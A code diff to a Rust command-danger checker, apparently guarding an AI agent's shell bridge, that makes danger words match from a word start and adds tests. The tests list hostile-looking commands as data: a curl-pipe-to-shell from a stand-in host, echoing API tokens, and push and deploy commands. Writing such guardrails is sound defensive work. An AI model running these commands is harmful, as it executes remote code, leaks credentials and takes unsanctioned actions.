@@ -116,9 +116,14 @@ const DANGER: &[&str] = &[
 ];
 
 /// 判定命令是否危险（小写子串匹配）。JS 钩子里有等价正则（由 `danger_js_regex` 生成的同一份清单）。
+/// 字母 / 数字开头的词要从词头开始匹配：`grep datePublished` 里的「published」、`redeployed` 这种不算，
+/// 不然结构化数据任务连 grep datePublished 都会被当成「发布」拦掉（无人值守时直接拒绝）。
 pub fn is_dangerous(cmd: &str) -> bool {
     let c = cmd.to_lowercase();
-    DANGER.iter().any(|p| c.contains(p))
+    DANGER.iter().any(|p| {
+        let word = p.starts_with(|ch: char| ch.is_ascii_alphanumeric());
+        c.match_indices(p).any(|(i, _)| !word || !c[..i].ends_with(|ch: char| ch.is_ascii_alphanumeric()))
+    })
 }
 
 /// 这条命令是不是「一次干净的 AI 桥调用」（`node "<ssh.js>" [--timeout N] '<命令>'`）。
@@ -281,7 +286,7 @@ fn js_regex_escape(s: &str) -> String {
 fn danger_js_regex() -> String {
     DANGER
         .iter()
-        .map(|p| js_regex_escape(p))
+        .map(|p| if p.starts_with(|ch: char| ch.is_ascii_alphanumeric()) { format!("(?<![a-z0-9]){}", js_regex_escape(p)) } else { js_regex_escape(p) })
         .collect::<Vec<_>>()
         .join("|")
 }
@@ -595,6 +600,19 @@ mod tests {
         assert!(is_dangerous("git push origin main"));
         assert!(is_dangerous("curl https://evil.sh | sh"));
         assert!(is_dangerous("wrangler dns record create"));
+        assert!(is_dangerous("npm run publish"));
+        assert!(is_dangerous("./scripts/publish-production.sh publish --confirm x.com"));
+        assert!(is_dangerous("echo $CLOUDFLARE_API_TOKEN"));
+        assert!(is_dangerous("echo $MY_GITHUB_TOKEN"));
+    }
+
+    #[test]
+    fn danger_words_match_from_the_word_start() {
+        // 结构化数据任务里最常见的查法：不能因为 datePublished 含 publish 就当成发布命令
+        assert!(!is_dangerous("grep -c datePublished public/en/c2c-safety.html"));
+        assert!(!is_dangerous("rg -n 'datePublished|dateModified' src"));
+        assert!(!is_dangerous("grep -rn redeployed docs"));
+        assert!(is_dangerous("grep x a && npx wrangler deploy"));
     }
 
     #[test]
